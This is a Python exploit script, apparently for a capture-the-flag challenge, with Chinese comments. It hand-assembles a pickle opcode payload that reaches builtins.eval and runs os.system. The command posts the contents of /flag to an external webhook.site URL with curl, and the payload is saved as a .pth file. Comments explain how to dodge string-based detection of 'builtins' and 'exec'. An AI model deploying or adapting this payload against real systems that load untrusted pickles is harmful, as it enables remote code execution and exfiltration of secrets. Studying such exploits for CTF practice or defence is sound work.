import pickle
import base64
import sys

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# 手动构造 OPCODE - 方案7
# 混合混淆：
# 1. 使用 STACK_GLOBAL 引入 builtin.exec/eval
# 2. 将 'builtins' 和 'exec' 字符串进行拆分拼接，避免直接出现完整字符串
# 3. 将 CMD 进行编码

# OPCODE
GLOBAL = b'c'
STACK_GLOBAL = b'\x93'
MARK = b'(' 
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
REDUCE = b'R'
BINUNICODE = b'X'
APPENDS = b'e' # 列表扩展
LIST = b']'    # 空列表
APPEND = b'a'  # 列表追加
TUPLE = b't'   # 构建元组（从标记处）
STOP = b'.'

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

payload = b'\x80\x04'

# 目标：获取 builtins.exec
# 为了绕过字符串检测，我们用 'bui' + 'ltins' 和 'ex' + 'ec' ?
# 实际上 Pickle 不好做字符串拼接（除了 map 比较麻烦）。
# 我们先尝试用 'sys.modules' 获取 'os'，这是一种经典绕过。
# 流程：
# get sys.modules ('sys', 'modules')
# get 'os' from dict 
# get 'system' from module
# call system(cmd)

# 1. 获取 sys.modules
# (GLOBAL 'sys' 'modules') - 可能会被查
# 使用 STACK_GLOBAL
payload += push_str('sys')
payload += push_str('modules')
payload += STACK_GLOBAL

# 2. 获取 'os' 模块
# 目前栈顶是 sys.modules 字典。
# 我们需要执行 dict.get(sys.modules, 'os') 或者 sys.modules['os']
# Pickle 也就是调用 __getitem__
payload += push_str('posix') # 在Linux上可能是'posix'或者'os'，通常'os'就在modules里
# 注意：sys.modules['os'] 可能未导入。
# 我们最好用 __import__('os')，即 builtins.__import__

# 切回方案：使用 builtins.eval 执行大量混淆的代码
# STACK_GLOBAL 'builtins' 'eval'
payload += push_str('builtins')
payload += push_str('eval')
payload += STACK_GLOBAL

# 准备 eval 的参数： "__import__('os').system('...')"
# 这里我们可以利用 bytes 转换或者其他技巧隐藏字符串
code_to_run = f"__import__('os').system('{CMD}')"
# 再次混淆：code_to_run = "eval(compile(bytes([...]),'','exec'))" ?
# 简单点：
payload += push_str(code_to_run)
payload += TUPLE1
payload += REDUCE
payload += STOP

if __name__ == "__main__":
    with open("nailong_payload_v7.pth", "wb") as f:
        f.write(payload)
    print("Generated v7")
